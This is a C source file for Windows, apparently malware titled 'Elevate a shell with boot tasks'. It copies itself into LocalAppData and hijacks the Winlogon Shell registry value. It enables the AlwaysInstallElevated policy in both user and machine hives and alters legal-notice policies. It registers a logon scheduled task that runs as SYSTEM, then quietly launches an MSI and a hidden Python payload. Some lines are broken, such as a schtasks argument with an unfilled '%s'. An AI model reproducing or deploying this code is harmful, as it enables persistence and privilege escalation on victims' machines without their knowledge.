// Elevate a shell with boot tasks

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

#define BASE_DIR L"ShellHook"
#define INSTALL_BAT L"install.bat" // What you want to execute on eleivation
#define PAYLOAD_PY L"payload.py" // Main payload

static void reg_set(HKEY root, const wchar_t* subkey, const wchar_t* value, const wchar_t* data) {
    HKEY hKey;
    if (RegCreateKeyExW(root, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, value, 0, REG_SZ, (BYTE*)data, (DWORD)((wcslen(data) + 1) * 2));
        RegCloseKey(hKey);
    }
}

static void reg_set_dword(HKEY root, const wchar_t* subkey, const wchar_t* value, DWORD data) {
    HKEY hKey;
    if (RegCreateKeyExW(root, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, value, 0, REG_DWORD, (BYTE*)&data, sizeof(data));
        RegCloseKey(hKey);
    }
}

static BOOL is_elevated(void) {
    HANDLE tok = NULL;
    TOKEN_ELEVATION e = {0};
    DWORD sz = sizeof(e);
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        GetTokenInformation(tok, TokenElevation, &e, sizeof(e), &sz);
        CloseHandle(tok);
    }
    return e.TokenIsElevated;
}

int main(void) {
    wchar_t base[MAX_PATH] = {0};
    wchar_t install_path[MAX_PATH] = {0};
    wchar_t payload_path[MAX_PATH] = {0};
    wchar_t self_path[MAX_PATH] = {0};

    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, base);
    wcscat(base, L"\\");
    wcscat(base, BASE_DIR);

    wcscpy(install_path, base);
    wcscat(install_path, L"\\");
    wcscat(install_path, INSTALL_BAT);

    wcscpy(payload_path, base);
    wcscat(payload_path, L"\\");
    wcscat(payload_path, PAYLOAD_PY);

    GetModuleFileNameW(NULL, self_path, MAX_PATH);

    reg_set_dword(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", L"AlwaysInstallElevated", 1);
    reg_set(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"legalnoticecaption", L"0x000000");
    reg_set(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"legalnoticetext", L"0xFFFFFF");

    CreateDirectoryW(base, NULL);

    CopyFileW(self_path, install_path, FALSE);

    wchar_t payload_src[MAX_PATH];
    GetModuleFileNameW(NULL, payload_src, MAX_PATH);
    *wcsrchr(payload_src, L'\\') = L'\0';
    wcscat(payload_src, L"\\payload.py");
    CopyFileW(payload_src, payload_path, FALSE);

    reg_set(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", install_path);

    if (_wcsicmp(self_path, install_path) != 0) {
        ShellExecuteW(NULL, L"open", install_path, NULL, NULL, SW_HIDE);
        return 0;
    }

    wchar_t task_cmd[MAX_PATH + 50];
    swprintf(task_cmd, MAX_PATH + 50, L"\"%s\"", install_path);

    ShellExecuteW(NULL, L"open", L"schtasks.exe", L"/create /tn SystemBootTask /tr \"%s\" /sc onlogon /ru SYSTEM /f", NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);
    ShellExecuteW(NULL, L"open", L"install.msi", NULL, NULL, SW_HIDE);

    if (is_elevated()) {
        reg_set(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", install_path);
        reg_set_dword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", L"AlwaysInstallElevated", 1);
        reg_set(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"legalnoticecaption", L"0x000000");
        reg_set(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"legalnoticetext", L"0xFFFFFF");
    } else {
        ShellExecuteW(NULL, L"open", L"schtasks.exe", L"/create /tn SystemBootTask /tr \"%s\" /sc onlogon /ru SYSTEM /f", NULL, SW_HIDE);
    }

    wchar_t py_cmd[MAX_PATH + 50];
    swprintf(py_cmd, MAX_PATH + 50, L"\"%s\"", payload_path);

    if (ShellExecuteW(NULL, L"open", L"pythonw.exe", py_cmd, NULL, SW_HIDE) <= 32) {
        ShellExecuteW(NULL, L"open", L"python.exe", py_cmd, NULL, SW_HIDE);
    }

    return 0;
}